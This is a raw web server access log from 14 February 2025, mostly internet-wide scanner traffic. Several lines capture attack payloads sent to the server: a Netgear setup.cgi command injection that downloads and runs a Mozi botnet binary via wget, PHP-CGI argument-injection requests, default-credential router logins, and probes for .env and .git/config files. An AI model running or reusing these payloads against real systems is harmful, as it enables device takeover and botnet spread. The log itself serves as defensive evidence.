46.105.70.190 - - [14/Feb/2025:01:53:03 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 zgrab/0.x"
196.251.91.11 - - [14/Feb/2025:02:00:46 +0000] "CONNECT 193.149.189.126:7227 HTTP/1.1" 400 157 "-" "-"
205.210.31.133 - - [14/Feb/2025:02:14:32 +0000] "GET / HTTP/1.0" 200 135 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
46.19.143.58 - - [14/Feb/2025:02:32:19 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.0.187 - - [14/Feb/2025:02:34:46 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
185.93.89.118 - - [14/Feb/2025:02:34:50 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [14/Feb/2025:02:34:50 +0000] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
46.218.79.98 - - [14/Feb/2025:02:42:05 +0000] "GET / HTTP/1.0" 200 135 "-" "-"
92.246.87.21 - - [14/Feb/2025:02:48:38 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.10 - - [14/Feb/2025:03:53:49 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.93.107.98 - - [14/Feb/2025:03:59:34 +0000] "CONNECT ip-api.com:443 HTTP/1.1" 400 157 "-" "-"
193.68.89.51 - - [14/Feb/2025:04:09:33 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.246.87.21 - - [14/Feb/2025:04:17:19 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.58 - - [14/Feb/2025:04:19:27 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.128.17 - - [14/Feb/2025:05:04:54 +0000] "\x05\x01\x00" 400 157 "-" "-"
185.224.128.17 - - [14/Feb/2025:05:04:54 +0000] "\x04\x01\x00P\x00\x00\x00\x01\x00example.com\x00" 400 157 "-" "-"
185.224.128.17 - - [14/Feb/2025:05:04:54 +0000] "CONNECT example.com:80 HTTP/1.1" 400 157 "-" "-"
109.205.213.198 - - [14/Feb/2025:05:09:44 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.246.87.21 - - [14/Feb/2025:05:45:15 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
64.226.79.183 - - [14/Feb/2025:05:49:03 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
193.68.89.10 - - [14/Feb/2025:06:04:16 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.58 - - [14/Feb/2025:06:10:10 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.246.87.21 - - [14/Feb/2025:07:09:42 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.169.110.2 - - [14/Feb/2025:07:13:54 +0000] "MGLNDD_193.93.76.135_8080" 400 157 "-" "-"
59.97.255.145 - - [14/Feb/2025:07:32:47 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.97.255.145:50270/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 153 "-" "-"
193.68.89.51 - - [14/Feb/2025:07:32:53 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
156.229.232.48 - - [14/Feb/2025:07:53:25 +0000] "CONNECT 45.61.136.175:7227 HTTP/1.1" 400 157 "-" "-"
193.68.89.10 - - [14/Feb/2025:07:55:06 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.58 - - [14/Feb/2025:07:59:26 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
60.191.125.35 - - [14/Feb/2025:08:27:58 +0000] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
92.246.87.21 - - [14/Feb/2025:08:38:46 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.178.110.163 - - [14/Feb/2025:08:40:38 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xE4\x92j\xE8T\xFA\xC6@\xE0*\x94AS\x9B\x17" 400 157 "-" "-"
195.178.110.163 - - [14/Feb/2025:08:40:38 +0000] "GET / HTTP/1.1" 400 157 "-" "-"
195.178.110.163 - - [14/Feb/2025:08:40:38 +0000] "GET / HTTP/1.1" 200 146 "-" "l9tcpid/v1.1.0"
195.178.110.163 - - [14/Feb/2025:08:40:45 +0000] "GET /.env.ci HTTP/1.1" 404 125 "-" "l9explore/1.2.2"
195.178.110.163 - - [14/Feb/2025:08:40:46 +0000] "GET /.env.local HTTP/1.1" 404 125 "-" "l9explore/1.2.2"
195.178.110.163 - - [14/Feb/2025:08:40:46 +0000] "GET /backup/.git/config HTTP/1.1" 404 125 "-" "l9explore/1.2.2"
193.68.89.10 - - [14/Feb/2025:09:53:56 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.58 - - [14/Feb/2025:09:54:49 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
157.245.144.188 - - [14/Feb/2025:10:03:38 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1F\xD9%\xD8\x16\x94\xE4C\xB6E\x98~\xF9s\xC9\x92\xC4\x19!\xB7\xB2-\x9C:B+\xB7\x86^1\xCCL\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
157.245.144.188 - - [14/Feb/2025:10:03:38 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB1\xBBv\xAAx\xE1\xFF\x87\x7Fs\x01\x1F\xDEp2$\x8A\xBC\x9B\xB3\xEC=W\xA0\xC0@|w\xAD\x9E\xB6@\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
157.245.144.188 - - [14/Feb/2025:10:03:38 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
157.245.144.188 - - [14/Feb/2025:10:03:39 +0000] "GET /download/powershell/ HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
157.245.144.188 - - [14/Feb/2025:10:03:39 +0000] "GET /get.php HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
92.246.87.21 - - [14/Feb/2025:10:05:49 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [14/Feb/2025:10:11:14 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
194.250.228.124 - - [14/Feb/2025:11:12:18 +0000] "\x16\x03\x00\x02\x00\x01\x00\x01\xFC\x03\x03\xFA\xD87\xA6\x0Bj\xF0\xF7*]\x11\x15\x1B\x10\x12\x10\x1F\xE0=\x7FX\x17\x8A\x9AE[\xF8\xB0\x8A\xD85t A\xA8\xF5\xF2p\xC2FS" 400 157 "-" "-"
194.250.228.124 - - [14/Feb/2025:11:12:18 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
24.76.119.247 - - [14/Feb/2025:11:22:03 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
24.76.119.247 - - [14/Feb/2025:11:22:18 +0000] "\x16\x03\x01\x012\x01\x00\x01.\x03\x03\xE3\x7F\x05\x8D\x84\x18\xAF\x18\xDB\xE6bK1\xF2\xD1\x90ZJ0\xDFB.\xD0\x00'\xC9h\x1D\x1F\xB0\x90\xD2\x00\x00\xB0\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
92.246.87.21 - - [14/Feb/2025:11:35:09 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
196.251.91.8 - - [14/Feb/2025:11:36:39 +0000] "CONNECT 193.149.189.126:7227 HTTP/1.1" 400 157 "-" "-"
46.19.143.58 - - [14/Feb/2025:11:40:06 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.10 - - [14/Feb/2025:12:00:43 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.165.191.27 - - [14/Feb/2025:12:14:32 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.165.191.27 - - [14/Feb/2025:12:14:34 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
185.165.191.27 - - [14/Feb/2025:12:14:34 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
78.108.177.54 - - [14/Feb/2025:12:27:23 +0000] "GET / HTTP/1.0" 200 135 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)"
216.218.206.105 - - [14/Feb/2025:12:30:38 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03;qf\x85q\xA8\xA8fN\xAA\xD3\xE1\xBA\x9C\xE3" 400 157 "-" "-"
37.183.150.87 - - [14/Feb/2025:12:41:16 +0000] "GET / HTTP/1.0" 200 135 "-" "curl/7.88.1"
45.115.89.211 - - [14/Feb/2025:12:50:11 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 153 "-" "-"
92.246.87.21 - - [14/Feb/2025:13:27:08 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [14/Feb/2025:13:32:07 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [14/Feb/2025:13:34:02 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
109.205.213.198 - - [14/Feb/2025:14:02:12 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
178.62.200.84 - - [14/Feb/2025:14:02:50 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x036\xC6\xD0\xFE;\xCF\xD1v`\xD8\xCFx\x02}lO\x0E\xC5`\x84\xA5\x97\xCA\xAF\xDEt\x0F\x03Yc\xF3L\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
178.62.200.84 - - [14/Feb/2025:14:02:50 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x5C|\x12r\x8F\x9B\x93\x8F\x10a\x1C\x1D\xA9ft\x8FP\x86\xD7v\xB8\xB9\xC1\x93\xA7c(\xBFG\x9B\xFA\xE4\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
178.62.200.84 - - [14/Feb/2025:14:02:50 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
178.62.200.84 - - [14/Feb/2025:14:02:50 +0000] "GET /download/powershell/ HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
178.62.200.84 - - [14/Feb/2025:14:02:50 +0000] "GET /get.php HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
193.68.89.51 - - [14/Feb/2025:14:33:57 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
195.32.2.11 - - [14/Feb/2025:14:38:05 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
65.49.1.114 - - [14/Feb/2025:14:38:56 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
65.49.1.112 - - [14/Feb/2025:14:39:30 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
65.49.1.115 - - [14/Feb/2025:14:39:48 +0000] "GET http://api.ipify.org/?format=json HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
65.49.1.118 - - [14/Feb/2025:14:39:59 +0000] "CONNECT www.shadowserver.org:443 HTTP/1.1" 400 157 "-" "-"
65.49.1.118 - - [14/Feb/2025:14:40:03 +0000] "GET /geoserver/web/ HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
115.231.78.11 - - [14/Feb/2025:14:59:22 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"
115.231.78.11 - - [14/Feb/2025:14:59:23 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.11 - - [14/Feb/2025:14:59:24 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.11 - - [14/Feb/2025:14:59:24 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
193.68.89.51 - - [14/Feb/2025:15:09:35 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [14/Feb/2025:15:20:51 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
52.183.224.28 - - [14/Feb/2025:15:44:55 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 zgrab/0.x"
141.255.166.90 - - [14/Feb/2025:16:02:03 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
85.90.246.159 - - [14/Feb/2025:16:05:01 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xAB\xB8\xE1\x8A_\xEEM\x90\x85\xD7\x85k\xC3&\xBB\x7F\x8E\xA4\x9B\x8A\xD5T\x95\x1A\xF3I5 \xA5\xCE$A\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
109.205.213.198 - - [14/Feb/2025:16:07:37 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [14/Feb/2025:16:19:07 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
193.68.89.10 - - [14/Feb/2025:16:22:16 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.58 - - [14/Feb/2025:17:14:58 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [14/Feb/2025:17:15:26 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [14/Feb/2025:17:16:11 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
20.238.100.89 - - [14/Feb/2025:17:31:52 +0000] "GET / HTTP/1.1" 200 124 "-" "Python/3.11 aiohttp/3.8.4"
92.246.87.21 - - [14/Feb/2025:17:41:27 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [14/Feb/2025:17:49:38 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
206.168.34.57 - - [14/Feb/2025:17:56:26 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.57 - - [14/Feb/2025:17:56:26 +0000] "GET /favicon.ico HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.57 - - [14/Feb/2025:17:56:27 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
141.255.166.90 - - [14/Feb/2025:18:05:04 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
5.235.205.101 - - [14/Feb/2025:18:10:19 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
147.185.132.91 - - [14/Feb/2025:18:20:09 +0000] "GET / HTTP/1.1" 200 124 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
59.93.90.142 - - [14/Feb/2025:18:44:48 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 153 "-" "-"
141.255.166.90 - - [14/Feb/2025:18:52:07 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [14/Feb/2025:18:57:04 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [14/Feb/2025:19:00:02 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.246.87.21 - - [14/Feb/2025:19:05:48 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
115.48.149.92 - - [14/Feb/2025:19:20:29 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 153 "-" "-"
193.68.89.51 - - [14/Feb/2025:19:55:02 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
92.255.57.58 - - [14/Feb/2025:20:05:31 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.68.89.10 - - [14/Feb/2025:20:18:40 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [14/Feb/2025:20:26:48 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
92.255.57.58 - - [14/Feb/2025:20:27:24 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.246.87.21 - - [14/Feb/2025:20:33:06 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [14/Feb/2025:20:41:30 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [14/Feb/2025:20:56:55 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [14/Feb/2025:21:20:00 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [14/Feb/2025:21:36:12 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
185.180.140.106 - - [14/Feb/2025:21:42:31 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
92.246.87.21 - - [14/Feb/2025:22:04:28 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
59.88.138.205 - - [14/Feb/2025:22:07:49 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 153 "-" "-"
141.255.166.90 - - [14/Feb/2025:22:11:15 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.10 - - [14/Feb/2025:22:12:56 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.105.70.190 - - [14/Feb/2025:22:24:55 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
193.68.89.51 - - [14/Feb/2025:22:27:55 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [14/Feb/2025:22:48:23 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [14/Feb/2025:22:53:04 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
87.236.176.227 - - [14/Feb/2025:23:05:08 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
193.68.89.51 - - [14/Feb/2025:23:09:42 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
205.210.31.221 - - [14/Feb/2025:23:29:58 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03*\x9B6\xFF7w\xC9\x1D\xEA\xC7\x15f\xD3X0'\xF9\xF7Z\xD57ED\x97\xE6\x86\xF56\x16y\xB1\xCA\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
205.210.31.221 - - [14/Feb/2025:23:29:58 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03#\x90\xDC\xFE%\xAE\xE2\x09" 400 157 "-" "-"
92.246.87.21 - - [14/Feb/2025:23:30:59 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
